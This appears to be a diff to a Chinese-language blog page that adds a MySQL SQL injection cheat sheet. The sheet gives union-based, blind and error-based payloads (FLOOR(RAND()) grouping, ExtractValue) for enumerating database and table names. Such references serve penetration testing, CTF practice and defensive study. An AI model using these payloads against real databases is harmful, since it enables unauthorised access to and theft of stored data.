@@ -309,7 +309,17 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="comment">/* 注释内容 */</span> <span class="number">1</span> <span class="keyword">FROM</span> tablename</span><br></pre></td></tr></table></figure></li>
 </ul>
 <hr>
-<h2 id="注入语句"><a href="#注入语句" class="headerlink" title="注入语句"></a>注入语句</h2>
+<h2 id="注入语句备忘"><a href="#注入语句备忘" class="headerlink" title="注入语句备忘"></a>注入语句备忘</h2><h3 id="数据库名"><a href="#数据库名" class="headerlink" title="数据库名"></a>数据库名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select database();</span><br><span class="line">select schema_name from information_schema.schemata;</span><br></pre></td></tr></table></figure>
+
+<h3 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h3><ul>
+<li><p>union  查询</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-- MySQL 4版本时用version=9，MySQL 5版本时用version=10</span><br><span class="line"> /* 列出当前数据库中的表 */</span><br><span class="line">union select group_concat(table_name) from information_schema.tables where version=10;</span><br><span class="line">/* 列出所有用户自定义数据库中的表 */</span><br><span class="line">union select table_name from information_schema.tables where table_schema=database();   </span><br><span class="line">select table_schema, table_name from information_schema.tables where table_schema!=&#x27;information_schema&#x27; and table_schema!=&#x27;mysql&#x27;;</span><br></pre></td></tr></table></figure></li>
+<li><p>盲注</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">select</span> substr(table_name,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">from</span> information_schema.tables <span class="operator">&gt;</span> <span class="string">&#x27;A&#x27;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));</span><br><span class="line">-- 在5.1.5版本中成功。</span><br></pre></td></tr></table></figure></li>
+</ul>
+
         </div>
 
         
